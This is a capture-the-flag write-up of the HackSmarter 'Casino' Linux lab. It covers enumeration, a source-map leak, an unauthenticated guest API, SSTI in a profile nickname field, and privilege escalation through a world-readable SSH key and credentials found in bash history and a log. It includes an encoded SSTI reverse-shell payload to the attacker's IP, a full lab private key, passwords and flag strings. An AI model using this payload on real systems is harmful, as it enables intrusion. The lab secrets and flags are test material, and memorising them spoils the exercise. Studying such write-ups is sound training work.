---
title: "Casino @ HackSmarter Writeup"
date: 2026-08-11
categories: [HackSmarter, Linux]
tags: [ssti, ssh-key-leak, log-disclosure]
image:
  path: /assets/casino.png
---

**Platform:** [Hacksmarter](https://www.hacksmarter.org/)

**Lab:** [Casino](https://www.hacksmarter.org/courses/cc04f9ec-35e3-4065-b972-9d0b84a7b371)

**Difficulty: Medium**

---

## Objective

Las Vegas is gearing up for a massive cybersecurity conference and we have been hired to conduct a penetration test against one of the casinos. The client, Hack Smarter World, is a luxury resort where many of the attendees will be staying. The objective is to identify all vulnerabilities and elevate privileges to root if possible.

For initial access, we were given only the IP of the WiFi Captive Portal with no other information.

## Enumeration

### Nmap

```bash
~> /hacksmarter/casino nmap 10.1.209.248 -sVC --min-rate 1000
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-11 16:30 +0100
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 16:30 (0:00:03 remaining)
Nmap scan report for 10.1.209.248
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 67:ed:f3:7a:db:bd:48:6c:b5:c1:a7:56:f2:14:c4:cd (ECDSA)
|_  256 fc:9f:65:7f:52:31:ba:ec:5c:b2:86:76:4a:a2:48:2e (ED25519)
80/tcp   open  http    Werkzeug httpd 3.1.8 (Python 3.10.18)
|_http-server-header: Werkzeug/3.1.8 Python/3.10.18
| http-title: Hack Smarter World - Guest WiFi & Portal
|_Requested resource was /login
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
| ssh-hostkey: 
|   3072 7d:c5:f5:ba:03:3e:f0:76:5c:9d:47:b6:39:b5:c7:a4 (RSA)
|   256 ed:5d:fa:ea:74:a0:56:b1:39:59:fc:c5:22:1e:5e:bd (ECDSA)
|_  256 50:31:d9:54:80:42:b8:44:cb:40:66:ea:cf:8f:cf:37 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports came back. SSH on 22, HTTP on 80 running Werkzeug 3.1.8 with Python 3.10.18, and a second SSH instance on port 2222. The Werkzeug banner is significant, it confirms a Python web application.

## HTTP (80)

<img width="1599" height="784" alt="image" src="https://github.com/user-attachments/assets/73753b4c-fa7b-4e79-998e-81f0d8f95f94" />

The portal asks for a room number and a guest last name to connect to the resort network. I tried SQL injection and brute force against the login, neither worked. With the direct approach exhausted, I went into the page source.

### Source Map Disclosure

The JavaScript bundle at `http://10.1.209.248/static/js/app.min.js` had a source map reference at the bottom:

`//# sourceMappingURL=app.min.js.map`

Accessing `http://10.1.209.248/static/js/app.min.js.map` revealed the original source code of the application, including a comment that exposed an internal API endpoint used by the front desk kiosk.

<img width="1529" height="284" alt="image" src="https://github.com/user-attachments/assets/5bc1f332-bf42-4714-ad97-301162c71609" />


### Unauthenticated API Endpoint

Navigating to `http://10.1.209.248/api/v1/rooms/status?status=occupied` returned a full list of all currently occupied rooms, including each guest's last name, room number, and membership tier.

<img width="1453" height="766" alt="image" src="https://github.com/user-attachments/assets/b6608f5c-7c2e-4380-9448-6922d078be66" />


That is exactly the combination the login form requires. I picked any user from the list and logged in.

---

## Foothold

### Accessing the Dashboard

<img width="1599" height="752" alt="image" src="https://github.com/user-attachments/assets/c72f7302-6f9a-4e9e-9914-062a93533d62" />

The dashboard loaded cleanly. I checked Wappalyzer to confirm the backend stack and it came back Python, consistent with the Werkzeug banner. I started looking for anywhere user input gets reflected back into the page. The profile settings page had a "Preferred Display Name / Nickname" field that displayed the saved name in a greeting back to the user.

To test for SSTI (Server Side Template Injection), I updated the nickname to `{{7*7}}` and saved. The result came back as 49, therefore confirming SSTI.

<img width="1237" height="741" alt="image" src="https://github.com/user-attachments/assets/f3e8f40f-0714-4ab7-aff5-07cb2234df8a" />


SSTI confirmed. The template engine evaluated the expression rather than rendering it as a string. I escalated to a reverse shell payload.

**Payload:**
`%7B%7B%20config.class.init.globals%5B'os'%5D.popen('bash%20-c%20"bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.200.80.158%2F1337%200%3E%261"').read()%20%7D%7D`

<img width="1032" height="291" alt="image" src="https://github.com/user-attachments/assets/e2260510-b94d-406a-9bc9-e4261fe6943c" />


---

## Lateral Movement -- Shell as george

As `www-data`, I browsed the filesystem looking for anything useful. The permissions on george's home directory were misconfigured. His `.ssh` folder was readable by everyone. His private key was sitting there unprotected.

```bash
www-data@0a2fbfd2899a:/home/george/.ssh$ cat id_rsa    
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxEuLMY97BYyhx4WwynCzUknHjRXuUWbK1GeiFpEYOku49W1qSqWs
sDrm7RtXfuQxVlYYG0tA8VKj+qdtjomZNvFIw5d6IIS52pKy6ctgrOBkU9BFj41dV+pule
ezP4ZzJREJlvCJLqK/wgmju24/sskNZij8Cs+O1/CVALSfcELZBGlO5YhBsjWkKETK+R0v
6do/S4DOl6Z5iti3rBnz3o30AvKykwdaw/VzFVvl7ceSLiv9UdZ92sYJY9ZfiT524gYibf
UprWMHqP8xaL4A2bbNKGP6efoadU1qDWQepBNmCxsBigBxNpdyaZdQBkZKdYBJfNuyr9hS
S5JqmEfbvQAAA8geQxCzHkMQswAAAAdzc2gtcnNhAAABAQDES4sxj3sFjKHHhbDKcLNSSc
eNFe5RZsrUZ6IWkRg6S7j1bWpKpaywOubtG1d+5DFWVhgbS0DxUqP6p22OiZk28UjDl3og
hLnakrLpy2Cs4GRT0EWPjV1X6m6V57M/hnMlEQmW8Ikuor/CCaO7bj+yyQ1mKPwKz47X8J
UAtJ9wQtkEaU7liEGyNaQoRMr5HS/p2j9LgM6XpnmK2LesGfPejfQC8rKTB1rD9XMVW+Xt
x5IuK/1R1n3axglj1l+JPnbiBiJt9SmtYweo/zFovgDZts0oY/p5+hp1TWoNZB6kE2YLGw
GKAHE2l3Jpl1AGRkp1gEl827Kv2FJLkmqYR9u9AAAAAwEAAQAAAQEAoj+2694m121og1yz
xoDlF804DhvkgpAucua+CV0g436XgPVReCX82SW2nqGM7qt7RFuhTV4kbdPbCmG9oqWFaO
6DMHhST/KlFE9RZwHeBMbs5oIuHPvB/dseUPXVKVrebfLpNEPZgByx15bUKSZ1rDeWxax2
uBDbhw2qe4zQhJ6p3KIDsMJShn6FXOAvwR/2rxpBweAFLVL7+hsbd1GjN9qqoaOxLQ/gEL
0Nz+3S98NPPgbAhkOtdKvtRqJdFPz7CmCbn5YJOYe+oDHP5IRvdCJI/YJnzyYCs//2Bzl6
AeJq/CCH+WZXGF8v+vxWkzgVZcvUPKOL0oV/OWFW/qF/mQAAAIEAp3ETDxsQBBKvPBWvXN
vl7VUk6SVsBe/3JudLpO9ID8f9Zfc6f4tp2isNO3mMdRRkx+bnDJNBjb1Hx756FTTUnqxq
/UB0CTn+oOLUGdXud1ac9o5bGT0Rpf18ZoswEMMZ0rxPeYkwk70BXUvaJF65iR6RGPYsGC
bYW+H7PbMznKoAAACBAOJ+iwFjrm4kqak3MJ6hP31lyob3yU87oRW2XwtHBwcip3WYjehC
Atwe4mCOONM9NMcYitIt62C14lnczLWO9k0VHfh/JEkl6ocoxDSwQ5x6qRTkBUwAUk+jpI
42mrQ2ULWHKD4QZdUhyX+7cHCO1jblpujiehsZ08XE65eOvkgfAAAAgQDd3d+85tBs3/1A
GlQJGdrEqHvhqxIYxgV6c8ds4vwO+HVHW5wUPB/Qdyvv8Hpr71ThNtCJuAt/LP4Qz7uQ0f
q8DzjL5ZB1sF0enBK48NPmajeiBMgP4wYtis5rdjr0GJ4Kgx5rraJblroAz06XVURGMgQb
w5A79e16fOnpM6IQowAAABFyb290QDBhMmZiZmQyODk5YQ==
-----END OPENSSH PRIVATE KEY-----
www-data@0a2fbfd2899a:/home/george/.ssh$ 
```

I copied the key locally, fixed permissions, and used it to SSH in on port 2222, the separate SSH instance from the nmap scan.

```bash
~> /hacksmarter/casino chmod 600 george_id_rsa
~> /hacksmarter/casino ssh -i george_id_rsa george@10.1.209.248 -p 2222
```

---

## Lateral Movement -- Shell as david

Standard enumeration as george turned up nothing immediately useful. Reading `.bash_history` was more productive. George had run `su david` followed by the password on the next line, and had also invoked mysql with the password passed directly in the command.

```bash
george@0a2fbfd2899a:~$ cat .bash_history
```
<img width="935" height="615" alt="image" src="https://github.com/user-attachments/assets/0210fcc4-7ae4-4bb1-9b5a-1b8720435ed2" />

`david : DavidPass2026!#`

```bash
george@0a2fbfd2899a:~$ su david
Password: DavidPass2026!#
```

<img width="551" height="137" alt="image" src="https://github.com/user-attachments/assets/14557a3f-3dba-4f2b-947c-f8bc0785c9a7" />


### What david Can Do

```bash
david@0a2fbfd2899a:~$ id
uid=1001(david) gid=1001(david) groups=1001(david),4(adm)
```

David is in the `adm` group. On Linux, the `adm` group grants read access to everything under `/var/log` without needing sudo. That is a significant privilege. Production logs often contain credentials, tokens, and sensitive operational data that were never intended to be visible to non-root users.

```bash
david@0a2fbfd2899a:~$ ls -la /var/log/
total 244
drwxr-xr-x 1 root root   4096 Aug 11 17:59 .
drwxr-xr-x 1 root root   4096 Jul 21  2025 ..
-rw-r--r-- 1 root root   9140 Aug  9 22:39 alternatives.log
drwxr-xr-x 1 root root   4096 Aug  9 22:38 apt
-rw-rw---- 1 root utmp    384 Aug 11 18:39 btmp
-rw-r--r-- 1 root root 145056 Aug  9 22:39 dpkg.log
-rw-r--r-- 1 root root  32064 Aug 11 17:59 faillog
-rw-rw-r-- 1 root utmp 292584 Aug 11 18:32 lastlog
-rw-r----- 1 root adm     612 Aug 11 17:59 provisioning.log
drwxr-xr-x 3 root root   4096 Aug  9 22:39 runit
drwxr-xr-x 2 root root   4096 Mar 21  2021 supervisor
-rw-r--r-- 1 root root    483 Aug 11 17:59 supervisord.log
-rw-rw-r-- 1 root utmp    384 Aug 11 18:32 wtmp
```


One file stood out immediately: `provisioning.log`, owned by `root:adm`.

```bash
david@8b5b653a9a12:~$ cat /var/log/provisioning.log
2026-08-01 03:14:02 [INFO] Starting automated cluster provisioning for Hack Smarter World host node...
2026-08-01 03:14:15 [INFO] Configuring network interfaces eth0 (VLAN 402)...
2026-08-01 03:14:22 [INFO] Initializing MariaDB production instance...
2026-08-01 03:14:28 [INFO] Seeding resort guest database tables...
2026-08-01 03:14:30 [SUCCESS] Applied security policy for root access.
2026-08-01 03:14:31 [DEBUG] Saved system root sync credential: R3s0rt_Sup3r_S3cr3t_R00t_2026!
2026-08-01 03:14:35 [INFO] Generating SSH host key certificates...
2026-08-01 03:14:45 [INFO] Deployment completed successfully.
```

A DEBUG log entry from the automated provisioning run had saved the system root credential in plaintext:

`root : R3s0rt_Sup3r_S3cr3t_R00t_2026!`

---

## Root

```bash
david@8b5b653a9a12:~$ su
Password: R3s0rt_Sup3r_S3cr3t_R00t_2026!
root@8b5b653a9a12:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flags

```bash
root@8b5b653a9a12:~# cat /home/george/user.txt
HSM{g30rg3_n33ds_b3tt3r_ssh_k3y_p3rms}

root@8b5b653a9a12:~# cat /root/root.txt
HSM{r3s0rt_w1f1_c0mpete_syst3m_pwn3d!}
```

**Happy hacking!!!!**

<img width="1100" height="850" alt="image" src="https://github.com/user-attachments/assets/8a219b33-67ff-478a-a469-0e356e29dcb5" />
